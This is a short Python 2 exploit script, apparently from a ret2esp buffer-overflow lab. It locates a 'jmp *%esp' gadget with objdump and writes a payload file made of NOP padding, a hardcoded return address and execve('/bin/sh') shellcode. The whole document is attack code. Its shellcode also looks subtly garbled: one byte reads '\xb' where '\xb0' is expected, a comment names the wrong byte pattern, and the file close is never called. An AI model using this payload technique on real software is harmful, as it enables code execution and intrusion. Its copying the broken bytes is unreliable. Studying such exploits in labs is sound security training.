#!/usr/bin/python

import os; 

#function to objdump a binary into a .txt file

os.system('objdump -d ret2esp | grep "ff e4" > objdumpfile.txt');

# function to parse the .txt file for byte value '5d'

for line in open('objdumpfile.txt', 'r'):
    if 'ff e4' in line:
        print line
	#print line.split()[0]
	#retaddr = line.split()[0].strip(':')
	#print retaddr

#function to convert retaddr into little endian

#retaddr = retaddr[::-1]
#print retaddr

# NOTE: "+" is a python way to cat two strings (NOT part of shellcode)
# This shellcode takes 24 bytes

shellcode ='\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb\x0b\xcd\x80';

# This address must match the address where jmp *%esp instruction is stored


retaddr = "\xcb\x84\x04\x08"; # 42840408 #we have to invoke a function which parses objdump of the executable to extract jmp *%esp address
 
# Fill NOP instruction
pad = "\x90" * 268; #  times because I need 268 bytes to hit the return address.

# Input string to our victim's program
arg = pad+retaddr+shellcode;
 
# Let us store the input string to a file
f =open("payload1", "w+");
f.write("%s" % arg) ;
f.close;
